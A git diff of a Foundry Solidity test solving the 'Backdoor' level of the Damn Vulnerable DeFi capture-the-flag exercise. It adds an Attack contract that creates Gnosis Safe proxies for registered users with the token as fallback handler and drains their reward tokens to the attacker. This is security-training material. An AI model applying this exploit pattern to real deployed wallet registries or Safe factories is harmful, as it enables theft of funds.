@@ -8,6 +8,8 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
 import {GnosisSafe} from "gnosis/GnosisSafe.sol";
 import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
+import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
+import {Enum} from "gnosis/common/Enum.sol";
 
 contract Backdoor is Test {
     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
@@ -83,18 +85,18 @@ contract Backdoor is Test {
         //GnosisSafe gs = new GnosisSafe();
         // for the test we at least should somehow call this proxyCreated function
         // maybe I need somehow create similar to gnosis safe contract in order to imitate it and the wallet registry will send their money to my address instead, idk
-address zero_address = vm.parseAddress("0x0000000000000000000000000000000000000000");
-        address[] memory _users = new address[](1);
-        _users[0] = users[0];
-        console.log(dvt.balanceOf(users[0]));
-        console.log(dvt.balanceOf(users[1]));
-        walletFactory.createProxyWithCallback(address(masterCopy),  abi.encodeWithSelector(GnosisSafe.setup.selector,_users, 1, attacker, 0x0, zero_address, zero_address, 0, zero_address), 42, walletRegistry);
+        // I've tried approach below, because I was figuring out how to execute transfer on proxy contract, but it was easier than I thought
+        //masterCopy.execTransaction(address(dvt), 0, abi.encodeWithSelector(dvt.transferFrom.selector, address(proxy), attacker, AMOUNT_TOKENS_DISTRIBUTED), Enum.Operation.DelegateCall, 500_000, 30000000000, 30000000000,0,0,)
+       
+        Attack attack = new Attack();
+        attack.attack(users, walletFactory, masterCopy, dvt, walletRegistry);
+        console.log(dvt.balanceOf(address(attacker)));
         vm.stopPrank();
         /**
          * EXPLOIT END *
          */
-        // validation();
-        // console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+        validation();
+        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
 
     function validation() internal {
@@ -116,5 +118,19 @@ address zero_address = vm.parseAddress("0x00000000000000000000000000000000000000
 
         // Attacker must have taken all tokens
         assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+
+contract Attack{
+
+    function attack(address[] calldata users, GnosisSafeProxyFactory walletFactory, GnosisSafe masterCopy, DamnValuableToken dvt, WalletRegistry walletRegistry) external{
+        for(uint256 i = 0; i < users.length; i++){
+            address[] memory _users = new address[](1); 
+            _users[0] = users[i];
+            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(address(masterCopy),  abi.encodeWithSelector(GnosisSafe.setup.selector,_users, 1, address(0), 0x0, address(dvt), address(0), 0, address(0)), 42, walletRegistry);
+            (bool success, ) = address(proxy).call(abi.encodeWithSelector(dvt.transfer.selector, msg.sender, dvt.balanceOf(address(proxy))));
+            require(success);
+        }
     }
 }
